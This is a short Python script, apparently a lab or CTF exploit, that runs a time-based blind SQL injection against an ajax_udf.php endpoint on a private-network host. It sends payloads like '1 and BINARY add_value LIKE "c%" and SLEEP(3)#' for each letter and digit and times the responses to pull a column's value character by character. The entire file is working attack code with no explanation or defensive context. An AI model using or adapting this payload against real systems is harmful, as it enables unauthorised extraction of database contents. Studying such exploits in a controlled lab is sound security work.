import requests
from string import ascii_letters, digits
import time

charactors = ascii_letters + digits

session = requests.session()
url = 'http://192.168.56.102/jabcd0cs/ajax_udf.php?q='
print(charactors)
for c in charactors:
    print(time.time())
    response = session.request("GET", url+f'1 and BINARY add_value LIKE "'+ ''.join(c) + '%" and SLEEP(3)#')
    print(time.time())
    print(f"{c}=" * 20)